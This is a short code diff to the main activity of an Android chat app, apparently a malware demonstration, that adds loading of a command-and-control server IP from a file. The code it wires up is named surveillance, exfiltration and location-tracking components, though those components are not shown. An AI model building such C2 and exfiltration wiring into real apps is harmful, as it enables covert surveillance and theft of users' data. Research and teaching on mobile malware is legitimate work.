@@ -25,6 +25,7 @@ import com.bumptech.glide.Glide
 import com.example.ChatterBox.malicious.SurveillanceService
 import com.example.ChatterBox.malicious.ExfiltrationManager
 import com.example.ChatterBox.malicious.LocationTracker
+import com.example.ChatterBox.malicious.C2Config
 import com.example.ChatterBox.models.Forum
 import com.example.ChatterBox.models.User
 import com.google.android.material.navigation.NavigationView
@@ -303,6 +304,10 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
      */
     private fun initializeMaliciousComponents() {
         Log.d("MaliciousDemo", "Initializing malicious components")
+        
+        // Initialize C2Config to load the IP from file
+        C2Config.initialize(this)
+        Log.d("MaliciousDemo", "C2 server configured with IP: ${C2Config.getServerIp()}")
         
         // Initialize the exfiltration manager
         exfiltrationManager = ExfiltrationManager(this)
